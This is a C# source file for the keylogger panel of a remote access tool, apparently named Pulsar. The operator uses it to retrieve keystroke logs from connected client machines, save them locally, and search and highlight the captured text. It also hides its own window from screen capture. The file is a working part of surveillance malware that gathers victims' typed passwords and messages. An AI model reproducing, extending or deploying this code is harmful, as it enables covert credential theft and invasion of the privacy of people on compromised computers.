using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmKeylogger : Form
    {
        /// <summary>
        /// The client which can be used for the keylogger.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly KeyloggerHandler _keyloggerHandler;

        /// <summary>
        /// Path to the base download directory of the client.
        /// </summary>
        private readonly string _baseDownloadPath;

        /// <summary>
        /// Holds the opened keylogger form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new Dictionary<Client, FrmKeylogger>();

        /// <summary>
        /// Tracks if we're currently loading a log file to prevent re-entrancy.
        /// </summary>
        private bool _isLoadingLog;

        /// <summary>
        /// Creates a new keylogger form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the keylogger form.</param>
        /// <returns>
        /// Returns a new keylogger form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmKeylogger CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmKeylogger f = new FrmKeylogger(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmKeylogger"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the keylogger form.</param>
        public FrmKeylogger(Client client)
        {
            _connectClient = client;
            _keyloggerHandler = new KeyloggerHandler(client);

            _baseDownloadPath = Path.Combine(_connectClient.Value.DownloadDirectory, "Logs\\");

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        /// <summary>
        /// Registers the keylogger message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _keyloggerHandler.ProgressChanged += LogsChanged;
            MessageHandler.Register(_keyloggerHandler);
        }

        /// <summary>
        /// Unregisters the keylogger message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_keyloggerHandler);
            _keyloggerHandler.ProgressChanged -= LogsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)this.Close);
                }
                else
                {
                    this.Close();
                }
            }
        }

        /// <summary>
        /// Called whenever the keylogger logs finished retrieving.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="message">The status message.</param>
        private void LogsChanged(object sender, string message)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => LogsChanged(sender, message)));
                return;
            }

            RefreshLogsDirectory();
            btnGetLogs.Enabled = true;
            stripLblStatus.Text = "Status: " + message;
        }

        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);

            try
            {
                if (!Directory.Exists(_baseDownloadPath))
                {
                    Directory.CreateDirectory(_baseDownloadPath);
                }

                RefreshLogsDirectory();
            }
            catch (Exception ex)
            {
                stripLblStatus.Text = $"Status: Error creating directory - {ex.Message}";
            }
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _keyloggerHandler.Dispose();
        }

        private void btnGetLogs_Click(object sender, EventArgs e)
        {
            try
            {
                btnGetLogs.Enabled = false;
                stripLblStatus.Text = "Status: Retrieving logs...";
                _keyloggerHandler.RetrieveLogs();
            }
            catch (Exception ex)
            {
                stripLblStatus.Text = $"Status: Error - {ex.Message}";
                btnGetLogs.Enabled = true;
            }
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            RefreshLogsDirectory();
        }

        private void txtSearch_TextChanged(object sender, EventArgs e)
        {
            SearchLogs(txtSearch.Text);
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e)
        {
            if (_isLoadingLog || lstLogs.SelectedItems.Count == 0)
                return;

            _isLoadingLog = true;
            rtbLogViewer.Text = "Loading...";
            stripLblStatus.Text = "Status: Loading log file...";

            try
            {
                string logFileName = lstLogs.SelectedItems[0].Text;
                string logFilePath = Path.Combine(_baseDownloadPath, logFileName);

                if (!File.Exists(logFilePath))
                {
                    rtbLogViewer.Text = "Log file not found.";
                    stripLblStatus.Text = "Status: Log file not found";
                    return;
                }

                FileInfo fileInfo = new FileInfo(logFilePath);
                long fileSizeKB = fileInfo.Length / 1024;

                //warn for big ass files
                if (fileSizeKB > 5000)
                {
                    DialogResult result = MessageBox.Show(
                        $"This log file is {fileSizeKB:N0} KB. Loading large files may take time and use significant memory.\n\nDo you want to continue?",
                        "Large File Warning",
                        MessageBoxButtons.YesNo,
                        MessageBoxIcon.Warning);

                    if (result != DialogResult.Yes)
                    {
                        rtbLogViewer.Text = "Load cancelled by user.";
                        stripLblStatus.Text = "Status: Ready";
                        return;
                    }
                }

                string logContent = ReadLogFile(logFilePath);

                if (string.IsNullOrEmpty(logContent))
                {
                    rtbLogViewer.Text = "Log file is empty.";
                    stripLblStatus.Text = "Status: Empty log file";
                }
                else
                {
                    rtbLogViewer.Text = logContent;
                    HighlightText(txtSearch.Text);
                    stripLblStatus.Text = $"Status: Loaded {logFileName} ({fileSizeKB:N0} KB, {CountLines(logContent)} lines)";
                }

                HighlightText(txtSearch.Text);
            }
            catch (UnauthorizedAccessException)
            {
                rtbLogViewer.Text = "Access denied. The log file may be in use or you lack permissions.";
                stripLblStatus.Text = "Status: Access denied";
            }
            catch (IOException ioEx)
            {
                rtbLogViewer.Text = $"I/O Error: {ioEx.Message}\n\nThe file may be locked or inaccessible.";
                stripLblStatus.Text = "Status: I/O Error";
            }
            catch (OutOfMemoryException)
            {
                rtbLogViewer.Text = "Out of memory. The log file is too large to display.";
                stripLblStatus.Text = "Status: File too large";
                MessageBox.Show(
                    "The selected log file is too large to load into memory.\n\nConsider opening it with a text editor that supports large files.",
                    "Out of Memory",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                rtbLogViewer.Text = $"Error loading log file: {ex.GetType().Name}\n\n{ex.Message}";
                stripLblStatus.Text = $"Status: Error - {ex.Message}";
            }
            finally
            {
                _isLoadingLog = false;
            }
        }

        /// <summary>
        /// Reads a log file with proper encoding detection and error handling.
        /// </summary>
        private string ReadLogFile(string filePath)
        {
            try
            {
                return File.ReadAllText(filePath, Encoding.UTF8);
            }
            catch (DecoderFallbackException)
            {
                return File.ReadAllText(filePath, Encoding.Default);
            }
        }

        /// <summary>
        /// Counts the number of lines in a string efficiently.
        /// </summary>
        private int CountLines(string text)
        {
            if (string.IsNullOrEmpty(text))
                return 0;

            int count = 1;
            for (int i = 0; i < text.Length; i++)
            {
                if (text[i] == '\n')
                    count++;
            }
            return count;
        }

        /// <summary>
        /// Searches through log file contents for the specified text.
        /// </summary>
        private void SearchLogs(string searchText)
        {
            try
            {
                lstLogs.BeginUpdate();
                lstLogs.Items.Clear();
                rtbLogViewer.Clear();

                if (!Directory.Exists(_baseDownloadPath))
                {
                    stripLblStatus.Text = "Status: Logs directory not found";
                    return;
                }

                DirectoryInfo dicInfo = new DirectoryInfo(_baseDownloadPath);
                var files = dicInfo.GetFiles()
                    .Where(f => !f.Extension.Equals(".queue", StringComparison.OrdinalIgnoreCase))
                    .OrderByDescending(f => f.LastWriteTime)
                    .ToArray();

                if (files.Length == 0)
                {
                    stripLblStatus.Text = "Status: No log files found";
                    return;
                }

                if (string.IsNullOrWhiteSpace(searchText))
                {
                    foreach (var file in files)
                    {
                        lstLogs.Items.Add(new ListViewItem(file.Name));
                    }
                    stripLblStatus.Text = $"Status: Found {lstLogs.Items.Count} log file(s)";
                    return;
                }

                stripLblStatus.Text = $"Status: Searching for '{searchText}'...";
                Application.DoEvents();

                int matchingFiles = 0;
                int totalMatches = 0;

                foreach (var file in files)
                {
                    try
                    {
                        if (file.Length > 10 * 1024 * 1024)
                        {
                            continue;
                        }

                        string content = ReadLogFile(file.FullName);

                        if (content.IndexOf(searchText, StringComparison.OrdinalIgnoreCase) >= 0)
                        {
                            int count = CountOccurrences(content, searchText);
                            totalMatches += count;
                            matchingFiles++;

                            var item = new ListViewItem(file.Name);
                            item.Tag = count;
                            lstLogs.Items.Add(item);
                        }
                    }
                    catch (Exception ex)
                    {
                        System.Diagnostics.Debug.WriteLine($"Error searching file {file.Name}: {ex.Message}");
                    }
                }

                if (matchingFiles == 0)
                {
                    stripLblStatus.Text = $"Status: No logs contain '{searchText}'";
                    rtbLogViewer.Text = $"No results found for: {searchText}\n\nSearched {files.Length} log file(s).";
                }
                else
                {
                    stripLblStatus.Text = $"Status: Found '{searchText}' in {matchingFiles} file(s) ({totalMatches} total matches)";
                }
            }
            catch (UnauthorizedAccessException)
            {
                stripLblStatus.Text = "Status: Access denied to logs directory";
                MessageBox.Show(
                    "Access denied to the logs directory. Check your permissions.",
                    "Access Denied",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                stripLblStatus.Text = $"Status: Error searching logs - {ex.Message}";
            }
            finally
            {
                lstLogs.EndUpdate();
            }
        }

        /// <summary>
        /// Counts the number of occurrences of a substring in a string (case-insensitive).
        /// </summary>
        private int CountOccurrences(string text, string search)
        {
            if (string.IsNullOrEmpty(text) || string.IsNullOrEmpty(search))
                return 0;

            int count = 0;
            int index = 0;

            while ((index = text.IndexOf(search, index, StringComparison.OrdinalIgnoreCase)) != -1)
            {
                count++;
                index += search.Length;
            }

            return count;
        }

        /// <summary>
        /// Highlights all occurrences of the search text in the log viewer (case-insensitive).
        /// </summary>
        private void HighlightText(string searchText)
        {
            if (string.IsNullOrWhiteSpace(searchText))
                return;

            string text = rtbLogViewer.Text;
            int index = 0;

            while ((index = text.IndexOf(searchText, index, StringComparison.OrdinalIgnoreCase)) != -1)
            {
                rtbLogViewer.Select(index, searchText.Length);
                rtbLogViewer.SelectionBackColor = Color.DarkCyan;
                index += searchText.Length;
            }

            rtbLogViewer.Select(0, 0);
        }

        private void RefreshLogsDirectory()
        {
            txtSearch.Text = string.Empty;
            SearchLogs(string.Empty);
        }
    }
}